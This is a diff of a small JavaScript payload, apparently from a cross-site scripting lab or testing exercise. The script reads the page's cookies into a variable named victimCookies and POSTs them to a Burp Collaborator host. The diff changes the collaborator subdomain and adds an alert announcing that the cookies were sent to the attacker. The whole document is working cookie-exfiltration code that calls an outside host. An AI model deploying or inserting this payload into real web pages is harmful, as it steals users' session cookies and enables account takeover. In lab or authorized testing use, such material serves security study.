@@ -1,6 +1,6 @@
 var victimCookies=document.cookie
 var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://kk8yw4pi2aq36xt6253wu8d4dvjm7cv1.oastify.com", true);
+xhr.open("POST", "https://fzis2fwmsfc00bi5a2cy9vbnbeh55vtk.oastify.com", true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 xhr.onreadystatechange = function() {
@@ -16,3 +16,5 @@ xhr.onreadystatechange = function() {
 
 var requestBody = "cookies=" + victimCookies;
 xhr.send(requestBody);
+
+alert("COOKIES SENT TO ATTACKER COLLAB")
